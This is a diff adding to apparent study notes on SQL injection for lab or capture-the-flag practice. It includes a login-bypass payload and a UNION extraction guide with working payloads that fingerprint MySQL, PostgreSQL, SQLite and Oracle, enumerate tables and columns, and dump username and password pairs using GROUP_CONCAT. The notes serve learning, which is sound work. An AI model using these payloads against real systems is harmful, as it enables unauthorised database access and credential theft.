@@ -253,3 +253,116 @@ SELECT * FROM users WHERE username='admin'--' AND password='anything' LIMIT 1;
 * **Target Vulnerability:** Blind SQLi within a standard application login form interface.
 * **Execution Strategy:** Input `' OR 1=1;--` into the username field with a random string in the password field.
 * **Tooling Assist:** Utilize the on-screen "SQL Query box" at the bottom of the lab page to visually inspect how your single/double quotes break out of the string literals within the backend `WHERE` clause.
+
+## Union attacks
+
+- Basics we already know, same number of columns in both side of the union with same data type, how do we figure it?
+    - using ORDER BY orders every sql query which returns data. we use it to check the number of columns, use `' ORDER BY 1 --` and keep increasing from 1 to 2,3,4.... untill it gives an error
+
+
+# 🗺️ The Ultimate SQLi UNION Extraction Guide
+
+A successful UNION attack requires perfectly mapping the underlying database structure before you can extract the target data (like flags or user credentials). Because every database engine stores its structural metadata differently, you must adapt your payloads.
+
+---
+
+## The 4-Phase UNION Methodology
+
+1. **Find the Column Count:** `' ORDER BY X --`
+2. **Find the Injection Point:** `' UNION SELECT 1,2,3,4 --` (Look for which number appears on the screen. We will assume column `2` is visible for all examples below).
+3. **Fingerprint the Database:** Ask the database what version it is.
+4. **Extract the Schema & Data:** Pull table names, then column names, then the actual data.
+
+---
+
+## Phase 3: Database Fingerprinting (Who am I talking to?)
+
+Inject these into your visible column to force the database to reveal its engine type and version.
+
+| Database Engine | Version Payload Example |
+| :--- | :--- |
+| **MySQL / MariaDB** | `' UNION SELECT 1, @@version, 3, 4 -- ` |
+| **PostgreSQL** | `' UNION SELECT 1, version(), 3, 4 -- ` |
+| **SQLite** | `' UNION SELECT 1, sqlite_version(), 3, 4 -- ` |
+| **Oracle** | `' UNION SELECT 1, banner, 3, 4 FROM v$version -- ` |
+
+*Note: If `@@version` works, you are dealing with MySQL. If it errors out, try `sqlite_version()`. Once you know the engine, proceed to Phase 4.*
+
+---
+
+## Phase 4: Schema Extraction (Finding the Tables)
+
+You need to know the names of the tables in the database (e.g., looking for `users`, `flags`, or `secrets`).
+
+### 🔴 MySQL & PostgreSQL (The `information_schema` Standard)
+These engines use a standard metadata database called `information_schema`. 
+
+**1. Extracting Table Names:**
+```sql
+' UNION SELECT 1, table_name, 3, 4 FROM information_schema.tables -- 
+
+```
+
+**2. Extracting Column Names (Once you find a table named 'users'):**
+
+```sql
+' UNION SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_name = 'users' -- 
+
+```
+
+### 🔵 SQLite (The `sqlite_master` Exception)
+
+SQLite **does not** use `information_schema`. It tracks its structure in a single, hidden master table called `sqlite_master`.
+
+**1. Extracting Table Names:**
+
+```sql
+' UNION SELECT 1, name, 3, 4 FROM sqlite_master WHERE type = 'table' --
+
+```
+
+**2. Extracting Column Names:**
+*SQLite does not have a separate column registry. Instead, you must extract the original `CREATE TABLE` command that was used to build the table. This command contains all the column names.*
+
+```sql
+' UNION SELECT 1, sql, 3, 4 FROM sqlite_master WHERE type = 'table' AND name = 'users' --
+
+```
+
+---
+
+## Phase 5: The Final Extraction (Getting the Flag)
+
+Once you know the target table (e.g., `users`) and the target columns (e.g., `username`, `password`), you extract the actual data. This syntax is universal across almost all database engines.
+
+```sql
+' UNION SELECT 1, username, password, 4 FROM users --
+
+```
+
+---
+
+## ⚠️ Advanced Tactic: The `GROUP_CONCAT()` Cheat Code
+
+**The Problem:** Sometimes the web application only displays the *first* row of the results, even if your `UNION` statement successfully extracted 50 table names.
+
+**The Solution:** Use `GROUP_CONCAT()`. This function takes multiple rows of output and squashes them into a single, comma-separated string, forcing all the data into the one row the web app is willing to display.
+
+**MySQL / SQLite Example (Dumping all tables into one line):**
+
+```sql
+' UNION SELECT 1, GROUP_CONCAT(table_name), 3, 4 FROM information_schema.tables --
+
+```
+
+*(Output on screen will look like: `users,products,flags,sessions`)*
+
+**Extracting multiple columns into one line:**
+
+```sql
+' UNION SELECT 1, GROUP_CONCAT(username || ':' || password), 3, 4 FROM users --
+
+```
+
+*(Output on screen will look like: `admin:hash1,user:hash2,guest:hash3`)*
+
